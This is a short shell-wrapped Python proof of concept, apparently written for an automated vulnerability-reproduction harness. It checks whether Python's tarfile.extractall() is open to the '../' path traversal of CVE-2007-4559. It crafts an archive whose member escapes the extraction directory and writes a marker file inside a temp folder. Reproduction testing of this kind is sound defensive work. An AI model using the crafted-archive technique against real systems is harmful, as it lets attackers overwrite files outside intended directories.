# PoC for CVE-2007-4559 — Python tarfile.extractall() directory traversal ("TarSlip").
# A tar member named with a ../ prefix escapes the extraction directory when a
# vulnerable tarfile extracts it without member filtering.
#
# Convention (per the reproduce agent): exit 0 == vulnerability REPRODUCED.
#   exit 0  -> a file was written OUTSIDE the extraction dir (vulnerable)
#   exit 1  -> tarfile rejected/sanitized the traversal (patched)
#
# Pure stdlib, no network, no pip install — runs offline under network-deny.
python3 - <<'PY'
import io
import os
import sys
import tarfile
import tempfile

work = tempfile.mkdtemp()
extract_dir = os.path.join(work, "extract")
os.makedirs(extract_dir)

# Target sits one level ABOVE the extraction dir; the member name traverses to it.
escaped = os.path.join(work, "ESCAPED_pwned")
member_name = os.path.relpath(escaped, extract_dir)  # -> ../ESCAPED_pwned
payload = b"owned-by-CVE-2007-4559\n"

buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as tar:
    info = tarfile.TarInfo(name=member_name)
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))
buf.seek(0)

# The classic vulnerable call: extractall with no member filtering.
with tarfile.open(fileobj=buf, mode="r") as tar:
    try:
        tar.extractall(extract_dir)
    except Exception as exc:  # a patched tarfile (filter='data') rejects the member
        print(f"NOT-VULNERABLE: extractall rejected traversal: {exc}")
        sys.exit(1)

if os.path.exists(escaped):
    print("VULNERABLE: member escaped the extraction directory (CVE-2007-4559)")
    sys.exit(0)

print("NOT-VULNERABLE: nothing written outside the extraction dir")
sys.exit(1)
PY
